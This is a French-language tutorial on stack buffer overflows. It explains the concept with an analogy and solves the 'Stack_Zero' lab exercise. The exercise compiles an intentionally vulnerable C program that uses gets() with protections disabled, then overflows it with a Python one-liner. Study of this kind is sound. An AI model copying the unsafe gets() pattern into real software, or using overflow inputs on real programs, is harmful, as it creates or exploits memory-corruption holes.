# Qu'est-ce que c'est ?

## Définition

l'attaque par débordement de mémoire tampon à lieu lorsqu'un attaquant va consciemment écrire trop de donnée dans un tampon de la pile qui va donc déborder sur d'autre et donc écrire sur des zones mémoires adjacentes.
## Analogie

c'est le même principe qu'avoir une rangé de gobelet pouvant chacun contenir une quantité précise d'eau, une personne malveillante va remplir le premier gobelet avec une carafe d'eau entière ce qui va déborder sur les autres.

### Fonctionnement normal :
![](attachments/Pasted%20image%2020240330121804.png)

### Buffer Overflow :
![](attachments/Pasted%20image%2020240330121834.png)
# Exercices 

## Stack_Zero

### Compiler le code source :

```bash
gcc stack_zero.c -o stack_zero -fno-stack-protector -z execstack -w

/usr/bin/ld: /tmp/cc3m1SI1.o: in function `main':
stack_zero.c:(.text+0x27): warning: the `gets' function is dangerous and should not be used.
```

### Execution normal du code :

```bash
./stack_zero
test
Loupé, retente!
```

### Analyse du code source :

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[32];
  modified = 0;

  gets(buffer);

  if(modified != 0) {
      printf("Tu as réussis à changer la variable 'modified' !\n");
  } else {
      printf("Loupé, retente!\n");
  }
}
```

1. une variable `buffer` est initialisé avec une taille de 32 octets dans la mémoire tampon
2. une variable `modified` est initialisé à 0
3. le programme demande une entrée utilisateur qui sera attribué a `buffer` grace à la fonction gets
4. si la variable `modified` à une valeur différente de 0, alors le challenge est réussit
5. si la variable `modified` est toujours à 0, alors le challenge n'est pas réussit.

Ici pour faire un buffer overflow, il faut exploiter la faille qu'engendre la fonction `gets()`, cette fonction ne vérifie pas la taille de ce qu'entre l'utilisateur ce qui veut dire que l'utilisateur peut entré une valeur supérieure à 32 octets

> pour corriger ce problème de sécurité, il faut utiliser la fonction `fgets()` au lieu de `gets()`
### exploitation :

Par rapport a l'analogie vu précédemment, la variable `buffer` est le premier gobelet peut contenir 32 unités d'eau et le second gobelet est la variable `modified` est vide. le but du challenge est donc de remplir le second gobelet.
afin d'exploiter la faille de l'utilisation de `gets()`, il faut simplement mettre en entrée utilisateur quelque chose de plus grand que 32 octets.

Il existe beaucoup de méthodes pour écrire beaucoup de caractères, vous êtes libre pour ça !
personnellement je vais utiliser Python :

```bash
python -c 'print("A" * 48)' | ./stack_zero

Tu as réussis à changer la variable 'modified' !
```


